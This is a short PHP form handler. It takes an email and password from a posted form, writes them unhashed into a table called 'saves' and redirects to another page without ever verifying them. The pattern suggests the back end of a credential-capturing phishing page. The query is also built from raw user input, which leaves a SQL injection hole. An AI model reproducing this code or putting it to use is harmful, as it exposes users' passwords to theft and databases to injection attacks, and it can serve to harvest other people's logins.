<?php
    require_once "conn.php";
    if(isset($_POST['submit'])){

        $user = $_POST['typeEmailX'];
        $pass = $_POST['typePasswordX'];

        if($user != "" && $pass != "" ){
            $sql = "INSERT INTO saves (`username`, `password`) VALUES ('$user', '$pass')";
            if (mysqli_query($conn, $sql)) {
                header("location: first.php");
            } else {
                 echo "Something went wrong. Please try again later.";
            }
        }else{
            echo "Username, Password cannot be empty!";
        }
    }
?>